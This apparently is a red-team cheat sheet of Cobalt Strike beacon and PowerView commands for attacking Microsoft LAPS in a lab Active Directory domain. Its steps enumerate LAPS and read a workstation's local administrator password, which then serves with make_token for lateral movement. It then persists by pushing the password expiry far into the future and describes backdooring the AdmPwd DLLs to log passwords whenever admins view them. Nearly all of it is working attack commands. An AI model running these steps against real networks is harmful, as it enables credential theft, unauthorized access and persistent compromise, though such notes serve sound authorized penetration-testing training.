# LAPS

# Check for presence of LAPS 

# LAPS client installed on local machine

    beacon> ls C:\Program Files\LAPS\CSE

# Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set

    powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# LAPS configuration deplayed through GPO

    beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Download LAPS configuration

    beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

    beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

# Parse the LAPS GPO Policy file downloaded in previous step 

    PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Identify the principals who have read right to LAPS password

    beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Use Laps Toolkit to identify Groups & Users who can read LAPS password

    beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
    beacon> powerpick Find-LAPSDelegatedGroups
    beacon> powerpick Find-AdmPwdExtendedRights

# View the LAPS password for given machine (From User Session having required rights)

    beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
    beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# Use the laps password to gain access

    beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
    beacon> ls \\wkstn-1\c$

# Set Far Future date as expiry (Only machine can set its Password)

    beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose

# LAPS Backdoor
- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user

